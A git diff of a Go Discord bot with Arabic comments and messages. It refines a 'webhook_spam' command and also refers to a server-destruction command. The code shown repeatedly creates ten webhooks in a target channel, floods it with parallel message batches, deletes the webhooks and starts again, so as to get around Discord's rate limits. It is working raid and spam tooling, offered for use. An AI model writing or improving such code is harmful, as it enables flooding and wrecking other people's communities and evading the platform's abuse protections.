@@ -134,7 +134,7 @@ func main() {
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
-					Content: "⚡ جاري تشغيل مجمع الويب هوكات (10 ويب هوكات 👈 استنفاد 👈 3 ثواني استراحة 👈 حذف وإنشاء جديد)...",
+					Content: "⚡ جاري تشغيل مجمع الويب هوكات الذكي...",
 					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
@@ -165,6 +165,7 @@ func main() {
 		fmt.Println("خطأ في تسجيل أمر تدمير السيرفر:", err)
 	}
 
+	// ⚠️ التعديل الجذري: تسجيل أمر الويب هوك هنا لكي يظهر في الديسكورد ولا يتم نسيانه
 	_, err = sess.ApplicationCommandCreate(sess.State.User.ID, "", webhookCmd)
 	if err != nil {
 		fmt.Println("خطأ في تسجيل أمر الويب هوك:", err)
@@ -344,7 +345,7 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 
 var webhookCmd = &discordgo.ApplicationCommand{
 	Name:        "webhook_spam",
-	Description: "سبام عبر مجمع ويب هوكات الذكي (10 ويب هوكات وتدوير دائم)",
+	Description: "سبام عبر مجمع ويب هوكات الذكي والحذف التلقائي",
 	Options: []*discordgo.ApplicationCommandOption{
 		{
 			Type:        discordgo.ApplicationCommandOptionChannel,
@@ -373,11 +374,6 @@ var webhookCmd = &discordgo.ApplicationCommand{
 	},
 }
 
-// دالة مجمع الويب هوكات المحدثة والمضبوطة تماماً:
-// 1. تنشئ 10 ويب هوكات جديدة.
-// 2. ترسل فيها دفعة الرسائل (بحدود 50 رسالة لكل جولة).
-// 3. تنتظر 3 ثواني استراحة.
-// 4. تحذف العشْرة ويب هوكات القديمة تماماً، وترجع تعيد الكرة حتى يكتمل العدد المطلوب.
 func executeBucketLimitWebhookRotation(token, channelID, webhookName, messageContent string, messagesCount int) {
 	headers := map[string]string{
 		"Authorization": "Bot " + token,
@@ -389,24 +385,24 @@ func executeBucketLimitWebhookRotation(token, channelID, webhookName, messageCon
 
 	sentMessages := 0
 	poolSize := 10
-	messagesPerPoolRound := 50 // عدد الرسائل لكل جولة مجمع قبل الحذف والتدوير
+	messagesPerPoolRound := 50
 
 	type WebhookInfo struct {
 		ID  string
 		URL string
 	}
 
+	round := 1
 	for sentMessages < messagesCount {
 		var pool []WebhookInfo
 		var mu sync.Mutex
 		var wgCreation sync.WaitGroup
 
-		// الخطوة 1: إنشاء 10 ويب هوكات جديدة للجولة الحالية
 		for i := 0; i < poolSize; i++ {
 			wgCreation.Add(1)
 			go func(index int) {
 				defer wgCreation.Done()
-				nameSuffix := fmt.Sprintf("-%d-%d", index+1, time.Now().UnixNano()%1000)
+				nameSuffix := fmt.Sprintf("-%d-%d", index+1, time.Now().UnixNano()%10000)
 				whPayload, _ := json.Marshal(map[string]string{"name": webhookName + nameSuffix})
 				whReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+channelID+"/webhooks", bytes.NewBuffer(whPayload))
 				for k, v := range headers {
@@ -421,15 +417,16 @@ func executeBucketLimitWebhookRotation(token, channelID, webhookName, messageCon
 
 				if whResp.StatusCode == http.StatusOK || whResp.StatusCode == http.StatusCreated {
 					var whResult map[string]interface{}
-					json.NewDecoder(whResp.Body).Decode(&whResult)
-					if id, okID := whResult["id"].(string); okID {
-						if tk, okTk := whResult["token"].(string); okTk {
-							mu.Lock()
-							pool = append(pool, WebhookInfo{
-								ID:  id,
-								URL: fmt.Sprintf("https://discord.com/api/v10/webhooks/%s/%s", id, tk),
-							})
-							mu.Unlock()
+					if err := json.NewDecoder(whResp.Body).Decode(&whResult); err == nil {
+						if id, okID := whResult["id"].(string); okID {
+							if tk, okTk := whResult["token"].(string); okTk {
+								mu.Lock()
+								pool = append(pool, WebhookInfo{
+									ID:  id,
+									URL: fmt.Sprintf("https://discord.com/api/v10/webhooks/%s/%s", id, tk),
+								})
+								mu.Unlock()
+							}
 						}
 					}
 				}
@@ -437,19 +434,16 @@ func executeBucketLimitWebhookRotation(token, channelID, webhookName, messageCon
 		}
 		wgCreation.Wait()
 
-		// إذا فشل في صنع الويب هوكات، انتظر ثانية وعيد المحاولة
 		if len(pool) == 0 {
 			time.Sleep(1 * time.Second)
 			continue
 		}
 
-		// تحديد عدد الرسائل المتبقية لهذه الجولة
 		currentBatchSize := messagesPerPoolRound
 		if messagesCount-sentMessages < currentBatchSize {
 			currentBatchSize = messagesCount - sentMessages
 		}
 
-		// الخطوة 2: إرسال الرسائل عبر الـ 10 ويب هوكات الحالية بالتوازي
 		var spamWg sync.WaitGroup
 		for j := 0; j < currentBatchSize; j++ {
 			spamWg.Add(1)
@@ -486,10 +480,8 @@ func executeBucketLimitWebhookRotation(token, channelID, webhookName, messageCon
 		spamWg.Wait()
 		sentMessages += currentBatchSize
 
-		// الخطوة 3: خلصت الجولة 👈 أخذ استراحة 3 ثواني
 		time.Sleep(3 * time.Second)
 
-		// الخطوة 4: حذف الـ 10 ويب هوكات القديمة نهائياً وبشكل متزامن
 		var delWg sync.WaitGroup
 		for _, wh := range pool {
 			delWg.Add(1)
@@ -506,7 +498,7 @@ func executeBucketLimitWebhookRotation(token, channelID, webhookName, messageCon
 		}
 		delWg.Wait()
 
-		// وقفة قصيرة جداً قبل بدء دورة الـ 10 ويب هوكات الجديدة التالية
+		round++
 		time.Sleep(500 * time.Millisecond)
 	}
 }
